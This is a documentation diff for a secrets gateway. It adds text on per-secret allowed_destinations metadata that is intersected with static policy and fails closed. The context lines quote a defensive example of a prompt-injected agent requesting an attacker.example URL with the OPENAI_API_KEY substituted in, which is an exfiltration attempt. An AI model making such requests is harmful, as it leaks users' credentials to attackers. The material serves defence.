@@ -376,6 +376,14 @@ the resolver is even consulted, so a prompt-injected agent calling
 `https://attacker.example/?key={% raw %}{{secret:OPENAI_API_KEY}}{% endraw %}`
 fails before the secret value is loaded into memory.
 
+Secrets created through the paste UI or `/control/secrets/set` can also
+carry dynamic `allowed_destinations` metadata. Static TOML policy and
+that sidecar metadata are enforced as an intersection: either source can
+narrow where a secret may be substituted, and neither can widen the
+other. If the sidecar metadata file is unreadable while a request needs
+destination-scoped substitution, the gateway fails closed rather than
+falling back to unrestricted substitution.
+
 If IronClaw detects a manually supplied credential, Calciforge returns
 a clear agent-readable block page and structured headers:
 
